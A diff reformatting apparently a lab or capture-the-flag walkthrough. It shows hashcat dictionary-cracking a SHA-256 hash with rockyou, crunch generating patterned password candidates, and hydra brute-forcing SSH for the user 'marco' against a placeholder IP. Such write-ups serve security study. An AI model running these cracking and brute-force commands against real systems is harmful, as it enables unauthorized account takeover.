@@ -280,14 +280,10 @@ d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b
 Hashcat was used in SHA-256 dictionary mode:
 
 ```bash
-hashcat -m 1400 -a 0 \
-  hash.txt \
-  /usr/share/wordlists/rockyou.txt
-```
+hashcat -m 1400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
 
 Relevant options:
 
-```bash
 -m 1400   SHA-256
 -a 0      Dictionary attack
 ```
@@ -329,8 +325,12 @@ A candidate list was generated with Crunch:
 
 ```bash
 crunch 13 13 -t Security20%%! -o pass_marco.txt
-```
 
+Options :
+13 13   fixed password length
+-t      custom pattern
+%       numeric character [0-9]
+```
 The pattern produced candidates such as:
 
 ```bash
@@ -342,22 +342,11 @@ Security2024!
 Security2029!
 ```
 
-In this Crunch pattern:
-
-```bash
-13 13   fixed password length
--t      custom pattern
-%       numeric character [0-9]
-```
 
 The generated passwords were then tested against SSH:
 
 ```bash
-hydra -l marco \
-  -P pass_marco.txt \
-  <TARGET_IP> \
-  -t 4 \
-  ssh
+hydra -l marco -P pass_marco.txt <TARGET_IP> -t 4 ssh
 ```
 
 A valid SSH credential was recovered:
